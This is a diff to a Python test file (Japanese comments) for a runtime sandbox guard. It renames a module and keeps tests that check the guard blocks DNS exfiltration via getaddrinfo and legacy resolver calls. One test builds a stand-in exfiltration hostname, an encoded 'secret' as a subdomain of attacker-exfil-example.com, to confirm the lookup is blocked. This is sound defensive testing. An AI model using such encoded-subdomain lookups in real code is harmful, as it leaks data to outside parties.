@@ -44,7 +44,7 @@ NAME = "guard_network_exfiltration - 封鎖中にUDPのsendto()が正しく遮�
 # 外部(攻撃者が管理する権威DNSサーバー)へ送出できる「DNS exfiltration」
 # 経路になっていることを発見した。本ファイルの`forbidden`集合に
 # "socket.getaddrinfo"を追加した修正の、継続的な再検証を本天使に追加
-# する。独立した別の防御層である`sefer/__init__.py`の
+# する。独立した別の防御層である`runtime_guard/__init__.py`の
 # `_michael_absolute_defense`も、同じ理由で"socket.getaddrinfo"を
 # `ALWAYS_PASSTHROUGH_AUDIT_EVENTS`から除外し、専用のallowed_hosts検査
 # を新設する同種の修正を別途行った(GRIMOIRE.md §CT参照)。
@@ -54,7 +54,7 @@ NAME = "guard_network_exfiltration - 封鎖中にUDPのsendto()が正しく遮�
 # ("socket.gethostbyname")・`gethostbyaddr()`("socket.gethostbyaddr")・
 # `getnameinfo()`("socket.getnameinfo")も同じDNS exfiltration経路に
 # なり得るが、本ファイルの`forbidden`集合に一度も含まれていなかった
-# ことを発見した。独立した別の防御層`sefer/__init__.py`の
+# ことを発見した。独立した別の防御層`runtime_guard/__init__.py`の
 # `_michael_absolute_defense`は、引数からホスト名/アドレスを抽出する
 # 汎用ロジックを既に備えていたため、これらは§CTより前から自動的に
 # 保護されていた(本件はmaquina_gatekeeper側のみの欠陥)。
@@ -204,51 +204,51 @@ def _check_getaddrinfo_is_allowed_when_unsealed() -> tuple:
         return False, f"予期しない例外: {type(e).__name__}: {e}"
 
 
-def _check_sefer_sanctum_blocks_unapproved_getaddrinfo() -> tuple:
+def _check_runtime_guard_sanctum_blocks_unapproved_getaddrinfo() -> tuple:
     """[新設 §CT] `maquina_gatekeeper.py`とは独立した別の防御層である
-    `sefer.Sanctum`(allowed_hosts方式)自身も、同じDNS exfiltration
+    `runtime_guard.Sanctum`(allowed_hosts方式)自身も、同じDNS exfiltration
     経路を正しく遮断することを確認する。許可ホストに含まれていない
     ホスト名(機密データを符号化したサブドメインを模したもの)での
-    socket.getaddrinfo()が、`sefer.LossOfAtaraxia`として遮断される
+    socket.getaddrinfo()が、`runtime_guard.LossOfAtaraxia`として遮断される
     ことを直接確認する。戻り値: (success: bool, detail: str)"""
-    import sefer
+    import runtime_guard
 
     "warmup".encode("idna")
     secret_payload = "c2VjcmV0LWRhdGEtMTIzNDU"
     hostname = f"{secret_payload}.attacker-exfil-example.com"
     try:
-        with sefer.Sanctum(allowed_dirs=["/tmp"], allowed_hosts={"approved.example.com"}):
+        with runtime_guard.Sanctum(allowed_dirs=["/tmp"], allowed_hosts={"approved.example.com"}):
             try:
                 socket.getaddrinfo(hostname, 80)
-                return False, "sefer.Sanctum起動中に許可外ホスト名でのgetaddrinfo()が遮断されなかった"
-            except sefer.LossOfAtaraxia:
+                return False, "runtime_guard.Sanctum起動中に許可外ホスト名でのgetaddrinfo()が遮断されなかった"
+            except runtime_guard.LossOfAtaraxia:
                 return True, "OK"
             except OSError as e:
                 # [正直な注記] 上のmaquina_gatekeeper版と同じ理由により、
                 # ここに到達すること自体が「遮断されず実際のOS解決処理
                 # まで進んでしまった」ことの証拠であり、安全側に倒して
                 # 失敗として報告する。
-                return False, f"sefer.Sanctumが遮断せず、実際のOS解決処理まで進んでしまった(OSError: {e})"
+                return False, f"runtime_guard.Sanctumが遮断せず、実際のOS解決処理まで進んでしまった(OSError: {e})"
     finally:
         pass
 
 
-def _check_sefer_sanctum_allows_approved_host_getaddrinfo() -> tuple:
-    """[新設 §CT・誤検知防止] `sefer.Sanctum`が、allowed_hostsに含まれる
+def _check_runtime_guard_sanctum_allows_approved_host_getaddrinfo() -> tuple:
+    """[新設 §CT・誤検知防止] `runtime_guard.Sanctum`が、allowed_hostsに含まれる
     ホスト名でのgetaddrinfo()、およびバインド用のNone(AI_PASSIVE)解決
     を誤って遮断しないことを確認する。戻り値: (success: bool, detail: str)"""
-    import sefer
+    import runtime_guard
 
     "warmup".encode("idna")
     try:
-        with sefer.Sanctum(allowed_dirs=["/tmp"], allowed_hosts={"127.0.0.1"}):
+        with runtime_guard.Sanctum(allowed_dirs=["/tmp"], allowed_hosts={"127.0.0.1"}):
             try:
                 socket.getaddrinfo("127.0.0.1", 80)
-            except sefer.LossOfAtaraxia as e:
+            except runtime_guard.LossOfAtaraxia as e:
                 return False, f"許可ホストへの正当なgetaddrinfo()が誤って遮断された: {e}"
             try:
                 socket.getaddrinfo(None, 8080, 0, socket.SOCK_STREAM, 0, socket.AI_PASSIVE)
-            except sefer.LossOfAtaraxia as e:
+            except runtime_guard.LossOfAtaraxia as e:
                 return False, f"バインド用のgetaddrinfo(None, ...)が誤って遮断された: {e}"
         return True, "OK"
     except Exception as e:
@@ -320,8 +320,8 @@ CHECKS = [
     ("maquina_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(sendmsg, §CM)", _check_udp_sendmsg_is_allowed_when_unsealed),
     ("maquina_gatekeeper.ultimate_audit_hook: DNS名前解決遮断(§CT)", _check_getaddrinfo_is_blocked_while_sealed),
     ("maquina_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(getaddrinfo, §CT)", _check_getaddrinfo_is_allowed_when_unsealed),
-    ("sefer.Sanctum: DNS名前解決の許可ホスト検査(§CT)", _check_sefer_sanctum_blocks_unapproved_getaddrinfo),
-    ("sefer.Sanctum: 許可ホスト・バインド用解決の誤検知防止(§CT)", _check_sefer_sanctum_allows_approved_host_getaddrinfo),
+    ("runtime_guard.Sanctum: DNS名前解決の許可ホスト検査(§CT)", _check_runtime_guard_sanctum_blocks_unapproved_getaddrinfo),
+    ("runtime_guard.Sanctum: 許可ホスト・バインド用解決の誤検知防止(§CT)", _check_runtime_guard_sanctum_allows_approved_host_getaddrinfo),
     ("maquina_gatekeeper.ultimate_audit_hook: 旧API DNS関連遮断(gethostbyname等, §CU)", _check_legacy_dns_lookups_are_blocked_while_sealed),
     ("maquina_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(旧API DNS関連, §CU)", _check_legacy_dns_lookups_are_allowed_when_unsealed),
 ]
@@ -336,7 +336,7 @@ def run_battery():
         try:
             success, detail = check_fn()
         except BaseException as e:
-            # [脆弱性修正 2026-10 §CO追記] sefer.LossOfAtaraxia等、
+            # [脆弱性修正 2026-10 §CO追記] runtime_guard.LossOfAtaraxia等、
             # BaseExceptionを直接継承する例外は`except Exception`では
             # 捕捉されず、検査関数が想定外にそれを発生させた場合、
             # 本来「安全側に倒して失敗として報告する」はずの設計が
@@ -370,7 +370,7 @@ def main():
         NAME,
         "封鎖中のUDP sendto()・sendmsg()による接続不要のデータ送信、"
         "getaddrinfo()によるDNS名前解決(§CT、maquina_gatekeeper・"
-        "sefer.Sanctumの両方の独立した防御層)、およびgethostbyname/"
+        "runtime_guard.Sanctumの両方の独立した防御層)、およびgethostbyname/"
         "gethostbyaddr/getnameinfo等の旧API経由のDNS関連呼び出し(§CU)が"
         "いずれも正しく遮断され、かつ非封鎖時・許可ホスト・バインド用"
         "解決はいずれも誤って遮断されないことを確認しました。",
